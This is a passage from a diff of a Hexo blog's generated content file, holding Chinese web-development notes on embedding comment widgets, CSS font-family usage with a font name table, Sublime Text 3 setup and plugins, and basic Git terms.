class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">    <span class="keyword">var</span> duoshuoQuery = &#123;<span class="attr">short_name</span>:<span class="string">"&lt;%= theme.duoshuo.domain%&gt;"</span>&#125;;</div><div class="line">    (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">        <span class="keyword">var</span> ds = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</div><div class="line">        ds.type = <span class="string">'text/javascript'</span>;ds.async = <span class="literal">true</span>;</div><div class="line">        ds.src = (<span class="built_in">document</span>.location.protocol == <span class="string">'https:'</span> ? <span class="string">'https:'</span> : <span class="string">'http:'</span>) + <span class="string">'//static.duoshuo.com/embed.js'</span>;</div><div class="line">        ds.charset = <span class="string">'UTF-8'</span>;</div><div class="line">        (<span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>] </div><div class="line">         || <span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>]).appendChild(ds);</div><div class="line">    &#125;)();</div><div class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- 多说公共JS代码 end --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="友言评论"><a href="#友言评论" class="headerlink" title="友言评论"></a>友言评论</h3><figure class="highlight erb"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="xml"><span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">"youyan"</span> <span class="attr">id</span>=<span class="string">"comments"</span>&gt;</span></span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"uyan_frame"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://v2.uyan.cc/code/uyan.js?uid=&lt;%=</span></span> theme.youyan.id<span class="xml"><span class="tag"><span class="string">%&gt;"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></div><div class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></div></pre></td></tr></table></figure>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ol>
+<li><strong>多说评论</strong>: <a href="http://duoshuo.com/" target="_blank" rel="external">http://duoshuo.com/</a></li>
+<li><strong>友言评论</strong>: <a href="http://www.uyan.cc/" target="_blank" rel="external">http://www.uyan.cc/</a></li>
+<li><strong>Disqus</strong>: <a href="https://disqus.com/" target="_blank" rel="external">https://disqus.com/</a></li>
+<li><strong><em>refactor: comments code &amp; configuration 评论模块优化</em></strong> by <strong>MOxFIVE</strong> on <code>2016/01/01</code>: <a href="https://github.com/MOxFIVE/hexo-theme-yelee/commit/3138ca36bd209fd9f79b60fbb6b15b44673560b5" target="_blank" rel="external">https://github.com/MOxFIVE/hexo-theme-yelee/commit/3138ca36bd209fd9f79b60fbb6b15b44673560b5</a></li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFIVE的优秀笔记 </category>
+            
+            <category> 博客配置 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Hexo </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[CSS font-family 网页字体使用小结]]></title>
+      <url>http://yikunhaocong.xyz/2015/12/09/css-font-family/</url>
+      <content type="html"><![CDATA[<p></p><h2 id="intro">前言</h2>一直到最近才开始调整博客的字体，之前都是全站微软雅黑了事。慢慢调整后发现 font-family 这个属性相关的知识还是不少的，整理一下常用的部分，分享于此。<p></p>
+<a id="more"></a>
+<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="使用语法"><a href="#使用语法" class="headerlink" title="使用语法"></a>使用语法</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">font-family</span>: 字体名1, 字体名2, 字体名<span class="selector-tag">n</span>, 字体系列名;</div><div class="line"><span class="selector-tag">font-family</span>: <span class="selector-tag">Verdana</span>, <span class="selector-tag">Helvetica</span>, "<span class="selector-tag">Microsoft</span> <span class="selector-tag">YaHei</span>", <span class="selector-tag">Arial</span>;</div></pre></td></tr></table></figure>
+<h3 id="语法说明"><a href="#语法说明" class="headerlink" title="语法说明"></a>语法说明</h3><blockquote>
+<ol>
+<li>系统将选择列表中最先可用的字体来显示文字;</li>
+<li>因为规则1，通常在最末添加一个 generic-family 字体系列名，保证文字获得相似的显示效果;</li>
+<li>因为规则1，西文字体名应该写在中文字体前，这样才能中英文同时使用不同字体;</li>
+<li>字体名为中文或包含空格等时，需要加双引号””才能正确识别;</li>
+<li>中文字体建议也是用其对应英文字体名，如”微软雅黑”为”Microsoft YaHei”，以提高编码兼容性。</li>
+</ol>
+</blockquote>
+<h2 id="常见字体系列"><a href="#常见字体系列" class="headerlink" title="常见字体系列"></a>常见字体系列</h2><h3 id="Serif-衬线字体"><a href="#Serif-衬线字体" class="headerlink" title="Serif 衬线字体"></a>Serif 衬线字体</h3><ul>
+<li>Times New Roman, Georgia 和宋体都是很常见的衬线字体；</li>
+<li>特征: 文字笔划的开始或结束处有额外的装饰，笔划有粗细之分。</li>
+</ul>
+<p><img src="/resources/serif.png" alt="serif"></p>
+<h3 id="Sans-serif-无衬线字体"><a href="#Sans-serif-无衬线字体" class="headerlink" title="Sans-serif 无衬线字体"></a>Sans-serif 无衬线字体</h3><ul>
+<li>Arial, Verdana, Tahoma, 微软雅黑都是很常见的无衬线字体;</li>
+<li>说明: <code>sans-</code>源于法语前缀，意思为<code>没有</code>。Sans-serif 也就是指无衬线字体。</li>
+<li>特征: 字体比较圆滑，笔划较为均匀。</li>
+</ul>
+<p><img src="/resources/sans-serif.png" alt="sans-serif"></p>
+<ul>
+<li>字体选用: 有种说法是正文多用衬线字体，易于区分；标题多用无衬线字体。不过这个也看个人喜好，我更习惯正文用无衬线字体。如果实在不知道怎么选，随便找一个自己看着舒服的网站，套用它的字体样式好了。</li>
+</ul>
+<h3 id="Monospace-等宽字体"><a href="#Monospace-等宽字体" class="headerlink" title="Monospace 等宽字体"></a>Monospace 等宽字体</h3><ul>
+<li>Courier New, Consolas, Menlo 都是比较常见的等宽字体;</li>
+<li>特征: 字母、数字、空格以及其他符号所占宽度都一致。识别度高，易于对齐和定位，通常用于显示代码。</li>
+</ul>
+<p><img src="/resources/Monospace.png" alt="Monospace"></p>
+<ul>
+<li>一个优秀的代码字体除了等宽外，还应该能较好地区分出<code>0 o O i l 1 I &quot;&quot; &#39;&#39; [] () {}</code> 等字符。</li>
+</ul>
+<h3 id="Cursive-手写体"><a href="#Cursive-手写体" class="headerlink" title="Cursive 手写体"></a>Cursive 手写体</h3><ul>
+<li>Comic Sans, Author, 华文行楷都是比较常见的仿手写体;</li>
+<li>特征: 模仿人的手写体，笔划圆滑或者有连笔等装饰。英文的花体，中文的行书草书等都属于此类。</li>
+</ul>
+<p><img src="/resources/cursive.png" alt="cursive"></p>
+<h2 id="获取字体名称"><a href="#获取字体名称" class="headerlink" title="获取字体名称"></a>获取字体名称</h2><p>同一个字体在不同系统和应用中可能会显示为不同名字，但其内部一般有一个不变的英文名字。CSS font-family 需要引用的就是字体的内部名字。</p>
+<h3 id="本地字体"><a href="#本地字体" class="headerlink" title="本地字体"></a>本地字体</h3><ul>
+<li>Win 上通过搜索或控制面板进入字体文件夹，然后双击字体查看字体名称;</li>
+<li>通过软件，如记事本、Office 等也可以查看字体名字:</li>
+</ul>
+<p><img src="/resources/font-a1.png" alt="font-a1"></p>
+<ul>
+<li>Mac 上搜索打开字体册即可，中间一栏显示的就是字体名称:</li>
+</ul>
+<p><img src="/resources/font-a2.png" alt="font-a2"></p>
+<h3 id="网页字体"><a href="#网页字体" class="headerlink" title="网页字体"></a>网页字体</h3><ul>
+<li>审查元素，查看生效的 font-family:</li>
+</ul>
+<p><img src="/resources/font-a3.png" alt="font-a3"></p>
+<ul>
+<li>通过 Chrome 插件 <a href="http://chengyinliu.com/whatfont.html" target="_blank" rel="external">WhatFont</a>:</li>
+</ul>
+<p><img src="/resources/font-a4.png" alt="font-a4"></p>
+<h2 id="字体图标"><a href="#字体图标" class="headerlink" title="字体图标"></a>字体图标</h2><p>使用<code>@font-face</code>引入字体后，可以像使用文字那样，无损的控制图标的大小，颜色等样式。常见的有 Webdings，Wingdings, <a href="http://fontawesome.io/" target="_blank" rel="external">Font Awesome</a>.</p>
+<p><img src="/resources/font-icon.png" alt="font-icon"></p>
+<h2 id="备用记录"><a href="#备用记录" class="headerlink" title="备用记录"></a>备用记录</h2><h3 id="字体配置"><a href="#字体配置" class="headerlink" title="字体配置"></a>字体配置</h3><ul>
+<li>下面是自己目前比较常用的字体配置，通常按系列设置为 CSS 预处理器的变量，方便调用。</li>
+</ul>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//中文</span></div><div class="line"><span class="attribute">font</span>-chs = <span class="string">"Microsoft YaHei"</span>, <span class="string">"Hiragino Sans GB"</span>, <span class="string">"WenQuanYi Micro Hei"</span></div><div class="line"><span class="comment">//无衬线字体 sans-serif</span></div><div class="line"><span class="attribute">font</span>-sans = Verdana, <span class="string">"Helvetica Neue"</span>, Helvetica, Tahoma, Arial</div><div class="line"><span class="comment">//衬线字体 serif</span></div><div class="line"><span class="attribute">font</span>-serif = Times, Georgia</div><div class="line"><span class="comment">//等宽字体 monospace</span></div><div class="line"><span class="attribute">font</span>-mono = Menlo, Consolas, <span class="string">"Source Code Pro"</span>, Inconsolata, Monaco, <span class="string">"Courier New"</span></div></pre></td></tr></table></figure>
+<h3 id="字体英文名"><a href="#字体英文名" class="headerlink" title="字体英文名"></a>字体英文名</h3><ul>
+<li>一些常见中文字体的对应英文名。</li>
+</ul>
+<style>
+    .fa-apple {
+        color: #9d9e9d;
+    }
+    .fa-windows {
+        color: #4ca6e7;
+    }
+</style>
+
+<table>
+<thead>
+<tr>
+<th style="text-align:center">-</th>
+<th>中文名</th>
+<th>英文名</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">1</td>
+<td><i class="fa fa-apple"></i> 苹方</td>
+<td>PingFang SC</td>
+</tr>
+<tr>
+<td style="text-align:center">2</td>
+<td><i class="fa fa-apple"></i> 冬青黑/苹果丽黑</td>
+<td>Hiragino Sans GB</td>
+</tr>
+<tr>
+<td style="text-align:center">3</td>
+<td><i class="fa fa-apple"></i> 思源黑体</td>
+<td>Source Han Sans CN</td>
+</tr>
+<tr>
+<td style="text-align:center">4</td>
+<td><i class="fa fa-apple"></i> 华文细黑</td>
+<td>STHeiti Light [STXihei]</td>
+</tr>
+<tr>
+<td style="text-align:center">5</td>
+<td><i class="fa fa-apple"></i> 华文黑体</td>
+<td>ST Heiti</td>
+</tr>
+<tr>
+<td style="text-align:center">6</td>
+<td><i class="fa fa-apple"></i> 华文楷体</td>
+<td>STKaiti</td>
+</tr>
+<tr>
+<td style="text-align:center">7</td>
+<td><i class="fa fa-apple"></i> 华文宋体</td>
+<td>STSong</td>
+</tr>
+<tr>
+<td style="text-align:center">8</td>
+<td><i class="fa fa-apple"></i> 华文仿宋</td>
+<td>STFangsong</td>
+</tr>
+<tr>
+<td style="text-align:center">9</td>
+<td><i class="fa fa-apple"></i> 丽黑 Pro</td>
+<td>LiHei Pro Medium</td>
+</tr>
+<tr>
+<td style="text-align:center">10</td>
+<td><i class="fa fa-apple"></i> 丽宋 Pro</td>
+<td>LiSong Pro Light</td>
+</tr>
+<tr>
+<td style="text-align:center">11</td>
+<td><i class="fa fa-apple"></i> 标楷体</td>
+<td>BiauKai</td>
+</tr>
+<tr>
+<td style="text-align:center">12</td>
+<td><i class="fa fa-apple"></i> 苹果丽中黑</td>
+<td>Apple LiGothic Medium</td>
+</tr>
+<tr>
+<td style="text-align:center">13</td>
+<td><i class="fa fa-apple"></i> 苹果丽细宋</td>
+<td>Apple LiSung Light</td>
+</tr>
+<tr>
+<td style="text-align:center">14</td>
+<td><i class="fa fa-windows"></i> 新细明体</td>
+<td>PMingLiU</td>
+</tr>
+<tr>
+<td style="text-align:center">15</td>
+<td><i class="fa fa-windows"></i> 细明体</td>
+<td>MingLiU</td>
+</tr>
+<tr>
+<td style="text-align:center">16</td>
+<td><i class="fa fa-windows"></i> 标楷体</td>
+<td>DFKai-SB</td>
+</tr>
+<tr>
+<td style="text-align:center">17</td>
+<td><i class="fa fa-windows"></i> (中易)黑体</td>
+<td>SimHei</td>
+</tr>
+<tr>
+<td style="text-align:center">18</td>
+<td><i class="fa fa-windows"></i> 宋体</td>
+<td>SimSun</td>
+</tr>
+<tr>
+<td style="text-align:center">19</td>
+<td><i class="fa fa-windows"></i> 新宋体</td>
+<td>NSimSun</td>
+</tr>
+<tr>
+<td style="text-align:center">20</td>
+<td><i class="fa fa-windows"></i> 仿宋</td>
+<td>FangSong</td>
+</tr>
+<tr>
+<td style="text-align:center">21</td>
+<td><i class="fa fa-windows"></i> 楷体</td>
+<td>KaiTi</td>
+</tr>
+<tr>
+<td style="text-align:center">22</td>
+<td><i class="fa fa-windows"></i> 仿宋_GB2312</td>
+<td>FangSong_GB2312</td>
+</tr>
+<tr>
+<td style="text-align:center">23</td>
+<td><i class="fa fa-windows"></i> 楷体_GB2312</td>
+<td>KaiTi_GB2312</td>
+</tr>
+<tr>
+<td style="text-align:center">24</td>
+<td><i class="fa fa-windows"></i> 微软正黑体</td>
+<td>Microsoft JhengHei</td>
+</tr>
+<tr>
+<td style="text-align:center">25</td>
+<td><i class="fa fa-windows"></i> 微软雅黑</td>
+<td>Microsoft YaHei</td>
+</tr>
+<tr>
+<td style="text-align:center">26</td>
+<td><i class="fa fa-file-word-o"></i>  隶书</td>
+<td>LiSu</td>
+</tr>
+<tr>
+<td style="text-align:center">27</td>
+<td><i class="fa fa-file-word-o"></i>  幼圆</td>
+<td>YouYuan</td>
+</tr>
+<tr>
+<td style="text-align:center">28</td>
+<td><i class="fa fa-file-word-o"></i>  华文中宋</td>
+<td>STZhongsong</td>
+</tr>
+<tr>
+<td style="text-align:center">29</td>
+<td><i class="fa fa-file-word-o"></i>  方正舒体</td>
+<td>FZShuTi</td>
+</tr>
+<tr>
+<td style="text-align:center">30</td>
+<td><i class="fa fa-file-word-o"></i>  方正姚体</td>
+<td>FZYaoti</td>
+</tr>
+<tr>
+<td style="text-align:center">31</td>
+<td><i class="fa fa-file-word-o"></i>  华文彩云</td>
+<td>STCaiyun</td>
+</tr>
+<tr>
+<td style="text-align:center">32</td>
+<td><i class="fa fa-file-word-o"></i>  华文琥珀</td>
+<td>STHupo</td>
+</tr>
+<tr>
+<td style="text-align:center">33</td>
+<td><i class="fa fa-file-word-o"></i>  华文隶书</td>
+<td>STLiti</td>
+</tr>
+<tr>
+<td style="text-align:center">34</td>
+<td><i class="fa fa-file-word-o"></i>  华文行楷</td>
+<td>STXingkai</td>
+</tr>
+<tr>
+<td style="text-align:center">35</td>
+<td><i class="fa fa-file-word-o"></i>  华文新魏</td>
+<td>STXinwei</td>
+</tr>
+<tr>
+<td style="text-align:center">36</td>
+<td><i class="fa fa-linux"></i> 文泉驿微米黑</td>
+<td>Wenquanyi Micro Hei</td>
+</tr>
+<tr>
+<td style="text-align:center">37</td>
+<td><i class="fa fa-linux"></i> 文泉驿正黑</td>
+<td>WenQuanYi Zen Hei</td>
+</tr>
+<tr>
+<td style="text-align:center">38</td>
+<td><i class="fa fa-linux"></i> 文泉驿点阵正黑</td>
+<td>WenQuanYi Zen Hei Sharp</td>
+</tr>
+</tbody>
+</table>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ol>
+<li><strong>Font Awesome</strong>: <a href="http://fontawesome.io/" target="_blank" rel="external">http://fontawesome.io/</a></li>
+<li><strong>Webdings和Wingdings字符码对应表</strong>: <a href="http://dwz.cn/2jOjYi" target="_blank" rel="external">http://dwz.cn/2jOjYi</a></li>
+<li><strong><em>CSS魔法堂：再次认识 font</em></strong> by <strong>肥仔John</strong> on <code>2015/3/3</code>: <a href="http://www.cnblogs.com/fsjohnhuang/p/4310533.html" target="_blank" rel="external">http://www.cnblogs.com/fsjohnhuang/p/4310533.html</a></li>
+<li><strong>有字库-中文在线字体</strong>: <a href="http://www.youziku.com/" target="_blank" rel="external">http://www.youziku.com/</a></li>
+<li><strong><em>谈谈网页设计中的字体应用 (2) serif 和 sans-serif</em></strong> by <strong>棕熊</strong> on <code>2008/5/6</code>: <a href="http://www.cnblogs.com/ruxpinsp1/archive/2008/05/06/font-in-front-end-development-2.html" target="_blank" rel="external">http://www.cnblogs.com/ruxpinsp1/archive/2008/05/06/font-in-front-end-development-2.html</a></li>
+<li><strong><em>Serif 和 Sans Serif 字体的区别</em></strong> by <strong>冰火九九</strong> on <code>2013/11/4</code>: <a href="http://blog.jobbole.com/50828/" target="_blank" rel="external">http://blog.jobbole.com/50828/</a></li>
+<li><strong><em>Chinese Web Font Guide</em></strong> by <strong>Kendra Schaefer</strong> on <code>2012/6/11</code>: <a href="http://www.kendraschaefer.com/2012/06/chinese-standard-web-fonts-the-ultimate-guide-to-css-font-family-declarations-for-web-design-in-simplified-chinese/" target="_blank" rel="external">http://www.kendraschaefer.com/2012/06/chinese-standard-web-fonts-the-ultimate-guide-to-css-font-family-declarations-for-web-design-in-simplified-chinese/</a></li>
+<li><strong>Fonts.css – 跨平台中文字体解决方案</strong>: <a href="http://zenozeng.github.io/fonts.css/" target="_blank" rel="external">http://zenozeng.github.io/fonts.css/</a></li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFIVE的优秀笔记 </category>
+            
+            <category> 网页设计 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> CSS </tag>
+            
+            <tag> font-family </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Sublime Text 3 使用配置与插件安装]]></title>
+      <url>http://yikunhaocong.xyz/2015/11/30/sublime-config/</url>
+      <content type="html"><![CDATA[<p>　　记录安装配置 Sublime 的过程，同时列出所用到的插件，方便自己在新系统新电脑上快速用上熟悉的 Sublime。 </p>
+<a id="more"></a>
+<h2 id="开始使用"><a href="#开始使用" class="headerlink" title="开始使用"></a>开始使用</h2><h3 id="软件下载"><a href="#软件下载" class="headerlink" title="软件下载"></a>软件下载</h3><ul>
+<li>一直使用的是 Sublime 3，直接转到 3 的 <a href="http://www.sublimetext.com/3" target="_blank" rel="external">下载页面</a> 好了。</li>
+</ul>
+<h3 id="用户设置"><a href="#用户设置" class="headerlink" title="用户设置"></a>用户设置</h3><ul>
+<li><code>Preferences/Settings - User</code>，设置字体为 <a href="http://pan.baidu.com/s/1mglgkSK" target="_blank" rel="external">Consolas 雅黑混合体</a> yx5g，字号11，tab 转空格，显示空格和制表符。</li>
+</ul>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">"font_face"</span>: <span class="string">"Yahei Consolas Hybrid"</span>,</div><div class="line"><span class="string">"font_size"</span>: <span class="number">11</span>,</div><div class="line"><span class="string">"translate_tabs_to_spaces"</span>: <span class="literal">true</span>,</div><div class="line"><span class="string">"draw_white_space"</span>: <span class="string">"all"</span>,</div><div class="line"></div><div class="line"><span class="comment">/*统一使用 UTF-8 编码和 UNIX 风格的换行符(LF, 0x0A)*/</span></div><div class="line"><span class="string">"default_line_ending"</span>: <span class="string">"unix"</span>,</div><div class="line"><span class="string">"default_encoding"</span>: <span class="string">"UTF-8"</span>,</div></pre></td></tr></table></figure>
+<blockquote>
+<p>其他设置参考 <code>Preferences/Settings - Default</code>。</p>
+</blockquote>
+<h2 id="基础插件"><a href="#基础插件" class="headerlink" title="基础插件"></a>基础插件</h2><h3 id="Package-Control"><a href="#Package-Control" class="headerlink" title="Package Control"></a><a href="https://packagecontrol.io/" target="_blank" rel="external">Package Control</a></h3><ul>
+<li>用于管理插件的插件，基础中的基础。之后列的插件全部通过 Package Control 安装。<blockquote>
+<p>插件使用与安装: <a href="https://packagecontrol.io/installation" target="_blank" rel="external">https://packagecontrol.io/installation</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Convert​To​UTF8"><a href="#Convert​To​UTF8" class="headerlink" title="Convert​To​UTF8"></a><a href="https://packagecontrol.io/packages/ConvertToUTF8" target="_blank" rel="external">Convert​To​UTF8</a></h3><ul>
+<li>文本编码自动转换，减少中日韩文乱码问题。<blockquote>
+<p>插件安装: Ctrl+Shift+P, Package Control: Installed Packages, 搜索 Convert​To​UTF8</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="IMESupport"><a href="#IMESupport" class="headerlink" title="IMESupport"></a><a href="https://packagecontrol.io/packages/IMESupport" target="_blank" rel="external">IMESupport</a></h3><ul>
+<li>解决输入法选字框不跟随问题。</li>
+</ul>
+<h3 id="Side​Bar​Enhancements"><a href="#Side​Bar​Enhancements" class="headerlink" title="Side​Bar​Enhancements"></a><a href="https://packagecontrol.io/packages/SideBarEnhancements" target="_blank" rel="external">Side​Bar​Enhancements</a></h3><ul>
+<li>自带边栏功能太少，必须安装此插件增强一下。</li>
+</ul>
+<h2 id="主题配色"><a href="#主题配色" class="headerlink" title="主题配色"></a>主题配色</h2><h3 id="Theme-Spacegray"><a href="#Theme-Spacegray" class="headerlink" title="Theme - Spacegray"></a><a href="https://packagecontrol.io/packages/Theme%20-%20Spacegray" target="_blank" rel="external">Theme - Spacegray</a></h3><ul>
+<li>Spacegray 主题的 Base16 Eighties Dark 配色方案看着最顺眼，用着最舒服。<br><img src="/resources/Base16-Eighties-Dark.jpg" alt="Base16 Eighties Dark color scheme"></li>
+</ul>
+<h2 id="代码规范"><a href="#代码规范" class="headerlink" title="代码规范"></a>代码规范</h2><h3 id="Sublime​Linter"><a href="#Sublime​Linter" class="headerlink" title="Sublime​Linter"></a><a href="https://packagecontrol.io/packages/SublimeLinter" target="_blank" rel="external">Sublime​Linter</a></h3><ul>
+<li>用于管理其他 code linting 代码规范插件。<blockquote>
+<p>使用说明: <a href="http://sublimelinter.readthedocs.org/en/latest/installation.html#installing-via-pc" target="_blank" rel="external">http://sublimelinter.readthedocs.org/en/latest/installation.html#installing-via-pc</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Sublime​Linter-jshint"><a href="#Sublime​Linter-jshint" class="headerlink" title="Sublime​Linter-jshint"></a><a href="https://packagecontrol.io/packages/SublimeLinter-jshint" target="_blank" rel="external">Sublime​Linter-jshint</a></h3><ul>
+<li>基于 <a href="http://jshint.com/" target="_blank" rel="external">JSHint</a>，用于检查规范 JavaScript 代码。<blockquote>
+<p>NPM 依赖包: <code>npm install -g jshint</code><br>使用说明: <a href="https://github.com/SublimeLinter/SublimeLinter-jshint" target="_blank" rel="external">https://github.com/SublimeLinter/SublimeLinter-jshint</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Sublime​Linter-csslint"><a href="#Sublime​Linter-csslint" class="headerlink" title="Sublime​Linter-csslint"></a><a href="https://packagecontrol.io/packages/SublimeLinter-csslint" target="_blank" rel="external">Sublime​Linter-csslint</a></h3><ul>
+<li>基于 <a href="https://github.com/CSSLint/csslint" target="_blank" rel="external">CSSLint</a>，用于检查规范 CSS 代码。<blockquote>
+<p>NPM 依赖包: <code>npm install -g csslint</code><br>使用说明: <a href="https://github.com/SublimeLinter/SublimeLinter-csslint" target="_blank" rel="external">https://github.com/SublimeLinter/SublimeLinter-csslint</a></p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Sublime​Linter-contrib-htmlhint"><a href="#Sublime​Linter-contrib-htmlhint" class="headerlink" title="Sublime​Linter-contrib-htmlhint"></a><a href="https://packagecontrol.io/packages/SublimeLinter-contrib-htmlhint" target="_blank" rel="external">Sublime​Linter-contrib-htmlhint</a></h3><ul>
+<li>基于 <a href="http://htmlhint.com/" target="_blank" rel="external">HTMLHint</a>，用于检查规范 HTML 代码。<blockquote>
+<p>NPM 依赖包: <code>npm install -g htmlhint@latest</code><br>使用说明: <a href="https://github.com/mmaday/SublimeLinter-contrib-htmlhint" target="_blank" rel="external">https://github.com/mmaday/SublimeLinter-contrib-htmlhint</a></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="常用插件"><a href="#常用插件" class="headerlink" title="常用插件"></a>常用插件</h2><h3 id="HTML-CSS-JS-Prettify"><a href="#HTML-CSS-JS-Prettify" class="headerlink" title="HTML-CSS-JS Prettify"></a><a href="https://packagecontrol.io/packages/HTML-CSS-JS%20Prettify" target="_blank" rel="external">HTML-CSS-JS Prettify</a></h3><ul>
+<li>格式化 HTML, CSS, JavaScript 及 JSON 代码。</li>
+</ul>
+<h3 id="Color-Highlighter"><a href="#Color-Highlighter" class="headerlink" title="Color Highlighter"></a><a href="https://packagecontrol.io/packages/Color%20Highlighter" target="_blank" rel="external">Color Highlighter</a></h3><ul>
+<li>直接在代码中预览颜色。</li>
+</ul>
+<h3 id="Stylus"><a href="#Stylus" class="headerlink" title="Stylus"></a><a href="https://packagecontrol.io/packages/Stylus" target="_blank" rel="external">Stylus</a></h3><ul>
+<li>使代码高亮支持 Stylus。</li>
+</ul>
+<h3 id="Stylus-Clean-Completions"><a href="#Stylus-Clean-Completions" class="headerlink" title="Stylus Clean Completions"></a><a href="https://packagecontrol.io/packages/Stylus%20Clean%20Completions" target="_blank" rel="external">Stylus Clean Completions</a></h3><ul>
+<li>Stylus 代码自动补全。</li>
+</ul>
+<h3 id="AutoFileName"><a href="#AutoFileName" class="headerlink" title="AutoFileName"></a><a href="https://packagecontrol.io/packages/AutoFileName" target="_blank" rel="external">AutoFileName</a></h3><ul>
+<li>文件名自动补全。<br><img src="/resources/autofilename.png" alt="AutoFileName"></li>
+</ul>
+<h3 id="Can-I-Use"><a href="#Can-I-Use" class="headerlink" title="Can I Use"></a><a href="https://packagecontrol.io/packages/Can%20I%20Use" target="_blank" rel="external">Can I Use</a></h3><ul>
+<li><a href="http://caniuse.com/" target="_blank" rel="external">http://caniuse.com/</a> 的插件版，快速查询 HTML, CSS 等前端技术的浏览器兼容性</li>
+</ul>
+<h3 id="BracketHighlighter"><a href="#BracketHighlighter" class="headerlink" title="BracketHighlighter"></a><a href="https://packagecontrol.io/packages/BracketHighlighter" target="_blank" rel="external">BracketHighlighter</a></h3><ul>
+<li>调整各类括号匹配的高亮样式</li>
+</ul>
+<h3 id="To-be-added"><a href="#To-be-added" class="headerlink" title="To be added"></a>To be added</h3><h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><ol>
+<li><strong>Package Control</strong>: <a href="https://packagecontrol.io/" target="_blank" rel="external">https://packagecontrol.io/</a></li>
+<li><strong>SublimeLinter</strong>: <a href="http://sublimelinter.readthedocs.org/" target="_blank" rel="external">http://sublimelinter.readthedocs.org/</a></li>
+<li><strong>JSHint</strong>: <a href="http://jshint.com/" target="_blank" rel="external">http://jshint.com/</a></li>
+<li><strong>CSSLint</strong>: <a href="https://github.com/CSSLint/csslint" target="_blank" rel="external">https://github.com/CSSLint/csslint</a></li>
+<li><strong>HTMLHint</strong>: <a href="http://htmlhint.com/" target="_blank" rel="external">http://htmlhint.com/</a></li>
+<li><strong>Stylus</strong>: <a href="http://learnboost.github.io/stylus/" target="_blank" rel="external">http://learnboost.github.io/stylus/</a></li>
+</ol>
+]]></content>
+      
+        <categories>
+            
+            <category> 来自MOxFIVE的优秀笔记 </category>
+            
+            <category> 软件配置 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Sublime </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[Git 基础命令与相关术语]]></title>
+      <url>http://yikunhaocong.xyz/2015/11/23/git-command/</url>
+      <content type="html"><![CDATA[<p>　　作者MOxFIVE的笔记基本上整理自网站 <a href="https://try.github.io" target="_blank" rel="external">Try Git</a>，一套很不错的 Git 在线入门教程。</p>
+<a id="more"></a>
+<h2 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h2><p>To initialize a Git repository here</p>
+<h3 id="Directory"><a href="#Directory" class="headerlink" title="Directory"></a>Directory</h3><ul>
+<li>A folder used for storing multiple files.</li>
+</ul>
+<h3 id="Repository"><a href="#Repository" class="headerlink" title="Repository"></a>Repository</h3><ul>
+<li>A directory where Git has been initialized to start version controlling your files.</li>
+</ul>
+<h2 id="git-status"><a href="#git-status" class="headerlink" title="git status"></a>git status</h2><p>See what the current state of the project is.</p>
+<h3 id="staged"><a href="#staged" class="headerlink" title="staged"></a>staged</h3><ul>
+<li>Files are ready to be committed.<h3 id="unstaged"><a href="#unstaged" class="headerlink" title="unstaged"></a>unstaged</h3></li>
+<li>Files with changes that have not been prepared to be committed.<h3 id="untracked"><a href="#untracked" class="headerlink" title="untracked"></a>untracked</h3></li>
+<li>Files aren’t tracked by Git yet. This usually indicates a newly created file.<h3 id="deleted"><a href="#deleted" class="headerlink" title="deleted"></a>deleted</h3></li>
+<li>File has been deleted and is waiting to be removed from Git.</li>
+</ul>
